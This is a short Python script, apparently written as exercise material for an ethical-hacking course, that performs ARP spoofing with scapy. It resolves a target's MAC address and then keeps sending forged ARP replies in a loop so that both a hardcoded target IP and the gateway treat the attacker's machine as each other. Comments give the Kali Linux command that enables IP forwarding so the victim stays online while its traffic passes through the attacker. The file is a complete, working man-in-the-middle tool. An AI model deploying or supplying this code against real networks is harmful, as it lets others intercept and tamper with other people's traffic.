#/usr/bin/env python
from scapy.layers.l2 import ARP, Ether
import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast / arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip): # restore '''version''' if printing
    target_mac = get_mac(target_ip)
    # print("I am the " + version + " mac: " + str(target_mac))
    # Send packet to Client (target_ip), telling it I have the Router (gateway) MAC Address.
    # ARP fields: op=2 (ARP Response). pdst=[TARGET_IP]. hwdst=[TARGET_MAC].
    # psrc=[SPOOF_IP](GATEWAY_IP) > tells the target I am the router
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# Remember, to stop the Target from loosing their internet connection, we need to
# activate IP Forwarding in Kali Linux, should return 1:
# echo 1 | sudo tee  /proc/sys/net/ipv4/ip_forward
sent_packets_count = 0
while True:
    # Tell the Target Device I am the Router.
    spoof("192.168.63.174","192.168.63.2")
    # Tell the Router I am the Target Device.
    spoof("192.168.63.2","192.168.63.174")
    sent_packets_count += 2
    # Use ,end="" for python 3
    print("\r[+] Packet Count: " + str(sent_packets_count)),
    sys.stdout.flush()
    # Add a delay.
    time.sleep(2) # Can quit by pressing Ctrl+c

